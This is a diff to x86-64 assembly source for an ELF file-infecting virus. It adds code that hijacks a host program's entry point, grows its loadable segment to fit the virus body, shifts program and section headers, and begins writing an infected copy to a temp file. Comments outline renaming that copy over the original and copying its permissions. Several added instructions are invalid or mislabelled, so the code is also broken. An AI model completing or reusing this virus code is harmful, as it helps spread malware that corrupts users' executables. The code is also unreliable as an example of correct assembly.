@@ -136,8 +136,8 @@ elf_header: times 4 dq 0
 file_stat_temp: times 13 dq 0
 
 vxhostentry: dq 0
-
-
+vxoffset: dq 0
+ventry equ $+vstart 
 
 fd:	dq 0
 fdlen equ $-fd
@@ -189,8 +189,8 @@ root_dirent:	dq 0
 
 ;;file pointed to by fstat is fd
 section .text
-global _start
-_start:
+global vstart
+vstart:
 	push rbp
 	mov rbp, rsp
 	sub rsp, 0x600
@@ -564,9 +564,85 @@ infect:
 	mov r13, rax
 	mov r12, [rax + elf_ehdr.phoff]		;address of host ELF Program Header Table in r12
 	mov r15, [rax + elf_ehdr.shoff] 	;address of host ELF Section Header Table in r15
-	
-	
 
+	
+	mov [vxhostentry], [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
+
+;****************************************************************************************
+;	Update program headers of infected ELF
+;
+;	e_phentsize == size of program header entry	
+;	size of program header table == e_phnum * e_phentsize
+;
+;	vx_offset = the offset to start of vx code after insertion into host program 
+;	vx_offset will replace e_entry in ELF header as the new entry point in infected ELF
+;
+;
+;****************************************************************************************
+	;mov word rcx, [rax + elf_ehdr.e_phnum]
+	mov word rdx, [rax + elf_ehdr.e_phentsize]
+
+	xor rcx, rcx
+	check_phdrs:
+		push rcx
+		.phdr_loop:
+			cmp rcx, 0
+			jg .mod_subsequent_phdr		
+			cmp [r12 + elf_phdr.p_type], PT_LOAD			
+			jne .mod_subsequent_phdr
+			mov r10, [r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+			add r10, [r12 + elf_phdr.p_filesz]
+			add r10, [ventry]				;new entry point = evaddr + ventry
+			mov qword [evaddr], r10
+			mov [rax + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
+			mov [vx_offset], [r12 + elf_phdr.p_offset] 
+			add [vx_offset], [r12 + elf_phdr.p_filesz]				
+			add [r12 + elf_phdr.p_filesz], vlen	
+			add [r12 + elf_phdr.p_memsz], vlen	
+
+			.mod_subsequent_phdr:
+				add [r12 + elf_phdr.p_offset], PAGESIZE
+		;.next_phdr:
+		pop rcx
+		inc rcx 
+		add r12, rdx 
+		cmp rcx, [rax + elf_ehdr.e_phnum]
+		jl .phdr loop
+
+;****************************************************************************************
+;	Now update section headers of infected ELF
+;****************************************************************************************
+
+	mov word rdx, [rax + elf_ehdr.e_shentsize]
+	xor r11, r11
+	xor rcx, rcx
+	check_shdrs:
+		push rcx
+		.shdr_loop:
+			cmp [r15 + elf_shdr.sh_offset], [vx_offset]	
+			jge .mod_subsequent_shdr
+			mov r11, [r15 + elf_shdr.sh_addr]
+			add r11, [r15 + elf_shdr.sh_size]
+			cmp r10, r11
+			jne .mod_subsequen_shdr
+			add [r15 + elf_shdr.sh_size], vlen
+
+
+			.mod_subsequent_shdr:
+				add [r15 + elf_shdr.sh_offset], PAGESIZE
+		;.next_shdr:
+		pop rcx
+		inc rcx 
+		add r15, rdx 
+		cmp rcx, [rax + elf_ehdr.e_shnum]
+		jl .phdr loop
+
+	mov [oshoff], [rax + elf_ehdr.e_shoff]
+	cmp [oshoff], [vxoffset]
+	;jg .patch_ehdr_shoff
+	jl frankenstein_elf
+
+	
 
 
 
@@ -595,7 +671,47 @@ infect:
 ;	infected ELF -- currently a temp file, to be renamed to that of the host
 ;
 ;
+;	Our plan for building this file will be to do the following:
+;	create new temp file ".xo.tmp"
+;	lseek to position 0 in .xo.tmp
+;	write modified elf header to .xo.tmp
+;	write modified program header to .xo.tmp
+;	lseek to host text segment in host ELF 
+;	copy (write) host text segment from host ELF to .xo.tmp
+;	write virus body to .xo.tmp
+;	write patched jmp to original host entry point (push ret), after  vx body in .xo.tmp
+;	write any padding bytes needed to maintain page alignment for temp file
+;	write modified section header table to .xo.tmp
+;	lseek to end of section header table in host ELF
+;	copy (write) remaining bytes (end of shdr table to EOF) from host ELF to .xo.tmp
+;	
+;	TODO: add routine for renaming .xo.tmp to original host file name
+;	TODO: add routine for changing permissions/owner of infected ELF to match 
+;			those of the original host file
+;	close temp file
+;	unmap file from memory
+;
 ;****************************************************************************************
+
+	frankenstein_elf:
+	
+		push 0x706d742e6f782e				;temp filename = ".xo.tmp"
+		pop rdi							;name of file in rdi
+		mov rsi, OPEN_RDWR 				;flags - read/write in rsi
+		xor rdx, rdx					;mode - 0
+		mov rax, SYS_OPEN
+		syscall
+
+
+
+
+
+
+
+
+
+
+
 
 ;;restore stack to original state
 _restore:
@@ -608,6 +724,7 @@ _end:
 	mov rax, 0x3c ;exit() syscall on x64
 	syscall	
 
+vlen equ $-vstart
 
 ;****************************************************************************************
 ;	paint function, writes buffer of 4 byte values (R G B Alpha) pixels to framebuffer
